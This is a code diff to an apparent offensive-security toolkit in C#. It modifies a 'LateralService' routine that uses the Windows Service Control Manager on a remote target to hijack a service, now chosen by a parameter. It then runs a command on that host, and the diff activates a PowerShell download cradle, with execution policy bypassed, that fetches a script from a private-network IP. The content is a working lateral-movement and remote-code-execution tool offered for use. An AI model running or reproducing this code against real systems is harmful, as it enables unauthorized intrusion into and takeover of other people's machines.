@@ -19,15 +19,16 @@ namespace ExtensionToolkit.Func
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
 
-        public static void LateralService(string target)
+        public static void LateralService(string target, string service)
         {
             // scshell
-            //string payload = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('http://192.168.45.195/1.ps1')";
-            string payload = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\test.csproj";
-            Console.WriteLine($"Attempting to exec {payload} on {target}");
+            string payload = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('http://192.168.49.120/2.ps1')";
+            //string payload = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\test.csproj";
+            Console.WriteLine($"Attempting to exec {payload} on {target} with service {service}");
 
             IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
-            string ServiceName = "defragsvc";
+            //string ServiceName = "defragsvc";
+            string ServiceName = service;
             IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
 
             // Modificar a configuração do serviço para incluir o comando completo
